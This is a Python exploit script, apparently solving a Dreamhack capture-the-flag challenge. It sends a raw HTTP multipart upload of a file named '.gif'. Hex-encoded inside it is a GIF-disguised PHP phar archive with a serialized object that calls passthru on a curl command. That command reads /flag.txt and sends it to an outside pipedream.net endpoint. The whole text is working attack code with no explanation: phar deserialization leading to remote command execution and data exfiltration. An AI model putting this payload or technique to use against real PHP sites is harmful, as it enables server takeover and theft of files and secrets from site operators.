import socket

s = socket.create_connection(('host3.dreamhack.games', 11468))

sdata = bytes.fromhex("4749463839613c3f706870205f5f48414c545f434f4d50494c455228293b203f3e0d0abd0000000100000011000000010000000000870000004f3a31313a2253757065726d61726b6574223a323a7b733a353a226772656574223b733a383a227061737374687275223b733a383a22637573746f6d6572223b733a36323a226375726c2068747470733a2f2f656f6f6462656f753031753377626d2e6d2e70697065647265616d2e6e65742f3f2428636174202f666c61672e74787429223b7d08000000746573742e7478740400000097e00867040000000c7e7fd8a40100000000000074657374c914dae015a534740a279f803601b11053f59c6b0200000047424d42")
print(sdata)

data = b'------WebKitFormBoundaryk7JA0ICUNs0Cea9N\r\nContent-Disposition: form-data; name="fileToUpload"; filename=".gif"\r\nContent-Type: application/octet-stream\r\n\r\n'+sdata+b'\r\n------WebKitFormBoundaryk7JA0ICUNs0Cea9N\r\nContent-Disposition: form-data; name="submit"\r\n\r\nupload\r\n------WebKitFormBoundaryk7JA0ICUNs0Cea9N\r\nContent-Disposition: form-data; name="emergent"\r\n\r\n------WebKitFormBoundaryk7JA0ICUNs0Cea9N--\r\n'
print(len(data))
send_data = b'POST /index.php HTTP/1.1\r\nHost: localhost\r\nContent-Length: '+str(len(data)).encode()+b'\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryk7JA0ICUNs0Cea9N\r\n\r\n'+data
print(send_data)
s.sendall(send_data)

while True:
    new = s.recv(4096)
    if not new:
      s.close()
      break
    print(new)